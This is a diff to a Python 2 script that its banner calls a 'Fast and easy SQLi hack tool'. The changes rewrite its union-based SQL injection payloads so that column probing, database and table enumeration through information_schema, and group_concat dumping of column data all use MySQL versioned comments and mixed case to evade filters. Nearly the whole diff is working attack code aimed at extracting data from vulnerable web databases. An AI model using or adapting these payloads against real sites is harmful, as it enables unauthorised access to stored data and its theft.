@@ -19,9 +19,8 @@ header="""
  / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
  \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
                          |___/                                                 
-
 More: https://www.facebook.com/TheCybersTeam
-Fast and easy SQLi hack tool Beta 2.2"
+Fast and easy SQLi hack tool Beta 2.3"
 """
 print header
 
@@ -80,23 +79,24 @@ class Sqli:
                 if j != 1 and j != self.columns+1:
                     line = line + ", "
                 if i == j:
-                    line+="'"+self.key+"'"
+                    line+="/*!50000ConCat(0x27,"+self.key+",0x27)*/"
                 else:
-                    line+="'"+str(j)+"'"
+                    line+="/*!50000ConCat(0x27,"+str(j)+",0x27)*/"
             res = self.getContent(self.url + line)
             if res.find(self.key) !=-1:
                 self.vulCol = i
                 return
         self.vulCol = 0
+        exit()
 
     def getConcat(self,string):
-        return "cONCaT(0x27,0x23,/*!50000group_concat("+string+")*/,0x23,0x27)"
+        return "/*!50000Concat(0x5e27,/*!50000gROup_cONcat("+string+")*/,0x275e)"
 
     def getVars(self,content):
-        pos = content.find("'#")
+        pos = content.find("^'")
         if(pos != -1):      
             ini = content[pos+2:]
-            pos = ini.find("#'")
+            pos = ini.find("'^")
             if(pos !=-1):
                 return ini[:pos]
             else:
@@ -120,15 +120,12 @@ class Sqli:
                     side = 1
             else:
                 self.build[side]+=line+str(i)
-
-
-        url = self.build[0]+self.getConcat("database()")+self.build[1]
+        url = self.build[0]+"/*!50000Group_Concat(0x5e27,database(),0x275e)*/"+self.build[1]
         res = self.getContent(url)
         return self.getVars(res)
 
     def getTables(self,database):
-
-        url = self.build[0]+self.getConcat("table_name")+self.build[1]+"++from+/*!50000inforMAtion_schema*/.tables+ /*!50000wHEre*/+/*!50000taBLe_scheMA*/like'"+database+"'--+"
+        url = self.build[0]+self.getConcat("table_name")+self.build[1]+"++from+/*!50000inforMAtion_schema*/.tables+ /*!50000wHEre*/+/*!50000taBLe_scheMA*/like+database()--+"
         res = self.getContent(url)
         return self.getVars(res)
 
@@ -160,7 +157,7 @@ class Sqli:
                 line+=",0x3a,"
             line+=name
             i+=1
-        url = self.build[0]+"concat(0x27,0x23,/*!50000gROup_cONcat("+line+")*/,0x23,0x27)"+self.build[1]+"+from+"+table+"--+-"
+        url = self.build[0]+"/*!50000ConCAt(0x5e27,/*!50000gROup_cONcat("+line+")*/,0x275e)"+self.build[1]+"+from+"+table+"--+-"
         res = self.getContent(url)
         data = self.getVars(res)
         try:
